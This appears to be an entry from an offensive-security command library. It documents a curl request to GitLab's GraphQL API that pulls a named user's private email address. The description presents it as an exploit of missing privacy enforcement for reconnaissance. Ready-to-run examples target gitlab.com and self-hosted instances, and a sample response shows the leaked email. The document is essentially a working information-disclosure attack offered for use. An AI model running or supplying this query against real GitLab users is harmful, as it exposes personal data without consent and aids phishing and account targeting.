---
data: >-
  curl -X POST ${GITLAB_URL}/api/graphql -H "Content-Type: application/json" -d
  '{"query": "query { user(username: \"${USERNAME}\") { email username } }"}'
tags:
  - graphql
  - disclosure
  - recon
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
  - Web
id: bd7ad4ba-53b4-4949-b4a0-5fb09dfdc279
created_at: '2025-12-14T17:25:53.462Z'
updated_at: '2025-12-14T17:25:53.462Z'
verified: false
validated: true
submitted: true
---
# curl-gitlab-graphql-user-query

## Command

```bash
curl -X POST ${GITLAB_URL}/api/graphql \
  -H "Content-Type: application/json" \
  -d '{"query": "query { user(username: \"${USERNAME}\") { email username } }"}'
```

## Description

This command uses curl to send a POST request to GitLab's GraphQL API, executing a query that retrieves a user's private email and username by providing only the username. It exploits the lack of privacy enforcement in the API resolver, useful for information disclosure during reconnaissance.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `${GITLAB_URL}` | The base URL of the GitLab instance (e.g., https://gitlab.com) | Yes |
| `${USERNAME}` | The target user's username (e.g., root or any known user) | Yes |
| `-X POST` | Specifies the HTTP method as POST | Yes |
| `-H "Content-Type: application/json"` | Sets the request header for JSON payload | Yes |
| `-d` | The data payload containing the GraphQL query | Yes |

## Examples

### Basic Usage

```bash
curl -X POST https://gitlab.com/api/graphql \
  -H "Content-Type: application/json" \
  -d '{"query": "query { user(username: \"exampleuser\") { email username } }"}'
```

### Advanced Usage

```bash
curl -X POST https://your-gitlab-instance.com/api/graphql \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer glpat-xxxxx" \
  -d '{"query": "query { user(username: \"targetuser\") { email username } }"}'
```

This includes an auth token for authenticated instances.

## Expected Output

A JSON response indicating success, such as:

```json
{
  "data": {
    "user": {
      "email": "private@example.com",
      "username": "targetuser"
    }
  }
}
```

Errors may return `{"errors":[{"message":"..."}]}` if the user doesn't exist or access is denied. The presence of the 'email' field confirms the disclosure.

## Related

- [[procedures/Exploit-GitLab-GraphQL-User-Query-to-Leak-Private-Email]]
